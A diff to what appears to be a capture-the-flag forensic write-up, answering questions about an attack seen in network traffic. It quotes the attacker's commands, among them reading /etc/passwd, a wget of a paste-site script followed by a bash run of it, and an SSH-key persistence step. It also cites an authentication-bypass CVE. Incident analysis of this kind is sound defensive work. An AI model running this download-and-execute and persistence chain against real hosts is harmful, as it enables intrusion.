@@ -75,13 +75,13 @@ http.content_type == "application/x-www-form-urlencoded" && urlencoded-form.valu
 
 ## If any, which text sharing site did the attacker utilise?
 
-After successful authentication the attacker makes a POST request to upload **"rce_api_extension.zip"** then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
+After successful authentication the attacker makes a POST request to a privileged API endpoint using CVE-2022-25237 to bypass auth. This call uploads **"rce_api_extension.zip"**, which allows command execution, then follows up with a few GET requests including **cmd=whoami**, **"cmd=cat%20/etc/passwd"** and ***"cmd=wget%20https://pastes.io/raw/bx5gcr0et8"*** then subsequently executes this file with **"cmd=bash%20bx5gcr0et8"**
 
 ### Answer: `pastes.io`
 
 ## Please provide the filename of the public key used by the attacker to gain persistence on our host.
 
-Following the link that the wget command uses leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and restart the SSH service
+Following the link that the wget command uses leads to a page with a simple bash script containing a curl command to append an SSH key to authorized_keys and a command to restart the SSH service
 
 ```    
 #!/bin/bash
@@ -91,7 +91,7 @@ sudo service ssh restart
 
 ### Answer: `hffgra4unv`
 
-## Can you confirmed the file modified by the attacker to gain persistence?
+## Can you confirm the file modified by the attacker to gain persistence?
 
 As seen above, the modified file is the **authorized_keys** file which has a new key appended to it
 
